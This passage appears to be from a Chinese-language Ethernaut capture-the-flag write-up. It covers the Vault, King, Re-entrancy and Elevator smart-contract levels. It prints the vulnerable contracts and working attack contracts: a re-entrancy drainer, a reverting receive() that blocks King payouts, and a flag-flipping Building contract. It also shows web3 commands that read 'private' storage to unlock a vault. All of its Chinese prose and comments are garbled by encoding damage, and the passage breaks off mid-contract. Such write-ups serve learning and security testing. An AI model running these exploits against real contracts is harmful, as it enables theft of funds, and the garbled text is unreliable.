<li>ÂêàÁ∫¶‰∏≠ÁöÑÂèòÈáèÊåâÁÖßÂÆö‰πâÁöÑÈ°∫Â∫èÂ≠òÂÇ®Âú® slot ‰∏≠</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// È¶ñÂÖàÁ°ÆÂÆöÂèòÈáèÂÆö‰πâÁöÑÈ°∫Â∫èÔºåÁ¨¨‰∏Ä‰∏™ÂèòÈáèÂ≠òÂÇ®Âú® slot 0ÔºåÁ¨¨‰∫å‰∏™ÂèòÈáèÂ≠òÂÇ®Âú® slot 1Ôºå‰ª•Ê≠§Á±ªÊé®</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getStorageAt</span><span class="p">(</span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">toAscii</span><span class="p">(</span><span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span><span class="p">)</span>
<span class="s2">&quot;A very strong secret password :)&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">unlock</span><span class="p">(</span><span class="s2">&quot;0x412076657279207374726f6e67207365637265742070617373776f7264203a29&quot;</span><span class="p">)</span>
</code></pre></div>
<ul>
<li>Â∞ÜÂèòÈáèÂ£∞Êòé‰∏∫ <code>private</code> Âè™ËÉΩÈò≤Ê≠¢ÂÖ∂ÂÆÉÂêàÁ∫¶ËÆøÈóÆ</li>
<li>‰∏∫‰∫Ü‰øùËØÅÊï∞ÊçÆÁöÑÊú∫ÂØÜÊÄßÔºåÂ∫îÂú®‰∏äÈìæÂâçÂä†ÂØÜÔºåÂØÜÈí•ÁªùÂØπ‰∏çËÉΩÂÖ¨ÂºÄ„ÄÇ<a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a> Êèê‰æõ‰∫Ü‰∏ÄÁßçÂú®‰∏çÊö¥Èú≤ÁßòÂØÜ‰ø°ÊÅØÁöÑÊÉÖÂÜµ‰∏ãÔºåËØÅÊòéÊüê‰∫∫ÊòØÂê¶ÊåÅÊúâÁßòÂØÜ‰ø°ÊÅØÁöÑÊñπÊ≥ï</li>
</ul>
<h3 id="_6">ÂèÇËÄÉËµÑÊñô<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p><a href="https://cryptomarketpool.com/access-private-data-on-the-eth-blockchain/">Crypto Market Pool - Access private data on the Ethereum blockchain</a></p>
<h2 id="9-king">9. King<a class="headerlink" href="#9-king" title="Permanent link">&para;</a></h2>
<p>ÈòªÊ≠¢ÂÖ≥Âç°ÂÆû‰æãÂú®Êèê‰∫§ÂêéÈáçÊñ∞Â£∞ÊòéÂõΩÁéãË∫´‰ªΩ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">King</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="nx">king</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">prize</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span><span class="w">  </span>
<span class="w">    </span><span class="nx">king</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">prize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// Âç≥‰ΩøËΩ¨Ë¥¶ÈáëÈ¢ùÂ∞è‰∫é prizeÔºåÂêàÁ∫¶ÁöÑÊâÄÊúâËÄÖ‰πüÂèØ‰ª•Â£∞ÊòéÂõΩÁéãË∫´‰ªΩ</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">prize</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">owner</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// ÂΩìÂâçÁöÑËΩ¨Ë¥¶ÈáëÈ¢ù‰ºöËΩ¨Áªô‰∏ä‰∏Ä‰ªªÂõΩÁéã</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">king</span><span class="p">).</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">    </span><span class="nx">king</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">    </span><span class="nx">prize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span><span class="w">  </span><span class="c1">// Êõ¥Êñ∞ prize</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">_king</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">address</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">king</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>ÂΩì <code>transfer</code> ÊâßË°åÂ§±Ë¥•Êó∂Ôºå‰ºöÊäõÂá∫ÂºÇÂ∏∏Ôºå‰∫§ÊòìÂõûÊªöÔºåÂÖ≥Âç°ÂÆû‰æãÂ∞±Êó†Ê≥ïÂÜçÂ£∞ÊòéÂõΩÁéãË∫´‰ªΩ‰∫Ü</li>
<li>
<p>Êü•ÁúãÂΩìÂâçÊúÄÈ´òÈáëÈ¢ù</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">toWei</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">fromWei</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">prize</span><span class="p">()))</span>
<span class="s2">&quot;1000000000000000&quot;</span>
</code></pre></div>
</li>
<li>
<p>Êñ∞Âª∫ÂêàÁ∫¶ÔºåÁî®‰∫éÂ£∞ÊòéÂõΩÁéãË∫´‰ªΩÔºåÂπ∂ÈòªÊ≠¢ÂÖ≥Âç°ÂÆû‰æãÂÜçÊàê‰∏∫ÂõΩÁéã</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">()</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">payable</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">0.001</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">1</span><span class="w"> </span><span class="nx">ether</span><span class="p">)}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span><span class="w">  </span><span class="c1">// Ê±ΩÊ≤πÈáè‰∏ÄÂÆöË¶ÅÁªôË∂≥ÔºÅ</span>
<span class="w">    </span><span class="c1">// ‰∏çËÉΩ‰ΩøÁî® transfer/sendÔºåÈªòËÆ§ 2300 Ê±ΩÊ≤πË¥π‰∏çË∂≥‰ª•ÊîØÊíëÂêéÁª≠Êìç‰Ωú</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">revert</span><span class="p">();</span><span class="w"> </span><span class="c1">// ‰Ωø king.transfer Êó†Ê≥ïÊàêÂäüÊâßË°å</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</li>
</ul>
<h2 id="10-re-entrancy">10. Re-entrancy<a class="headerlink" href="#10-re-entrancy" title="Permanent link">&para;</a></h2>
<p>Á™ÉÂèñÂêàÁ∫¶ÊâÄÊúâÁöÑüí∞</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.12</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Reentrance</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">donate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_who</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Âà©Áî®ÂÖàËΩ¨ÂÜçÂáè</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li>Âú®Êé•Êî∂ÂêàÁ∫¶ÁöÑ <code>fallback</code> ÂáΩÊï∞‰∏≠ÂÜçË∞ÉÁî® <code>withdraw</code> ÂáΩÊï∞</li>
<li>
<p>ÂÖàÁúãÁúãÂêàÁ∫¶ÁöÑÂàùÂßãËµÑÈáë</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">getBalance</span><span class="p">(</span><span class="nx">instance</span><span class="p">)</span>
<span class="s2">&quot;1000000000000000&quot;</span>
</code></pre></div>
</li>
<li>
<p>ËÆ°ÂàíÂàÜ 9 Ê¨°ÂèñÂÆåÔºà‰πüÂèØ‰ª•Â§öÊçêËµ†ÔºåÂáèÂ∞ëÂèñÂá∫Ê¨°Êï∞Ôºâ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.6.12</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Reentrance</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">using</span><span class="w"> </span><span class="nx">SafeMath</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">uint256</span><span class="p">;</span>
<span class="w">  </span><span class="nx">mapping</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">balances</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">donate</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_to</span><span class="p">].</span><span class="nx">add</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_who</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">balance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balances</span><span class="p">[</span><span class="nx">_who</span><span class="p">];</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">withdraw</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">result</span><span class="p">,)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="nx">_amount</span><span class="p">}(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="k">if</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">_amount</span><span class="p">;</span><span class="w">  </span><span class="c1">// does nothing</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="nx">balances</span><span class="p">[</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">]</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">_amount</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">Reentrance</span><span class="w"> </span><span class="nx">reentrance</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">reentrance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Reentrance</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">reentrance</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">125000000000000</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">receive</span><span class="p">()</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">.</span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">value</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">gasleft</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">6000</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">reentrance</span><span class="p">.</span><span class="nx">withdraw</span><span class="p">(</span><span class="mf">125000000000000</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>

<span class="p">}</span>
</code></pre></div>
</li>
<li>
<p>ÂêàÁ∫¶ Hack ÈÉ®ÁΩ≤ÂÆåÊàêÂêéÔºåËøõË°å„ÄåÊçêËµ†„Äç</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">donate</span><span class="p">(</span><span class="s2">&quot;&lt;hack-address&gt;&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="mf">125000000000000</span><span class="p">});</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">fromWei</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="s2">&quot;&lt;hack-address&gt;&quot;</span><span class="p">))</span>
<span class="s2">&quot;0.000125&quot;</span>
</code></pre></div>
</li>
<li>
<p>ÈöèÂêéÂºÄÂßã„ÄåÁõóÈí±„ÄçÔºåÂä°ÂøÖÁªôË∂≥Ê±ΩÊ≤π :)
    &gt; Êú¨Ê¨°Ê±ΩÊ≤πÈáèÂèÇËÄÉÔºö200,000 | 156,169 (78.08%)</p>
</li>
<li>
<p>‰∏çÊé®Ëçê‰ΩøÁî® <code>transfer</code> Âíå <code>send</code> Êù•‰ª£Êõø <code>call</code>ÔºåÂèØËÉΩÂΩ±Âìç Istanbul Á°¨ÂàÜÂèâ‰πãÂêéÁöÑÂêàÁ∫¶ÔºàÈÉ®ÂàÜÊåá‰ª§Ê∂àËÄóÊ±ΩÊ≤πÈáèÂ¢ûÂä†Ôºâ</p>
</li>
<li>Ê∞∏ËøúÂÅáËÆæËΩ¨Ë¥¶ÁöÑÊé•Êî∂ÊñπÊòØÂè¶‰∏Ä‰∏™ÂêàÁ∫¶ÔºåËÄåÈùûÊôÆÈÄöÁöÑÂú∞ÂùÄ</li>
</ul>
<h2 id="11-elevator">11. Elevator<a class="headerlink" href="#11-elevator" title="Permanent link">&para;</a></h2>
<p>Âà∞ËææÈ°∂Â±ÇÔºÅ</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="kr">interface</span><span class="w"> </span><span class="nx">Building</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">);</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Elevator</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">top</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">floor</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">goTo</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_floor</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Building</span><span class="w"> </span><span class="nx">building</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">_floor</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// Á¨¨‰∏ÄÊ¨°ËøîÂõû false</span>
<span class="w">      </span><span class="nx">floor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_floor</span><span class="p">;</span>
<span class="w">      </span><span class="nx">top</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">building</span><span class="p">.</span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">floor</span><span class="p">);</span><span class="w">  </span><span class="c1">// Á¨¨‰∫åÊ¨°ËøîÂõû true</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><code>Interface</code> ÂÜÖÈÉ®‰∏çËÉΩÂÆûÁé∞‰ªª‰ΩïÂáΩÊï∞Ôºå‰ΩÜÂèØ‰ª•ÁªßÊâøËá™ÂÖ∂ÂÆÉÊé•Âè£ÔºåÊâÄÊúâÂ£∞ÊòéÁöÑÂáΩÊï∞ÂøÖÈ°ªÊòØÂ§ñÈÉ®ÁöÑÔºå‰∏çËÉΩÂ£∞ÊòéÊûÑÈÄ†ÂáΩÊï∞ÂíåÁä∂ÊÄÅÂèòÈáè</li>
<li>„ÄåÁîµÊ¢ØÂ∫îËØ•Âú®Âª∫Á≠ëÈáå„ÄçÔºåÂÆûÁé∞Ëøô‰∏™ <code>Building</code> ÂêàÁ∫¶Â∞±Â•ΩÂï¶ &gt;_&lt;</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Building</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">isLastFloor</span><span class="p">(</span><span class="nx">uint</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">flag</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">!</span><span class="nx">flag</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">flag</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Elevator</span><span class="w"> </span><span class="nx">elevator</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Elevator</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">elevator</span><span class="p">.</span><span class="nx">goTo</span><span class="p">(</span><span class="mf">1</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Elevator</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="nx">bool</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">top</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">floor</span><span class="p">;</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">goTo</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_floor</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">Building</span><span class="w"> </span><span class="nx">building</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Building</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>

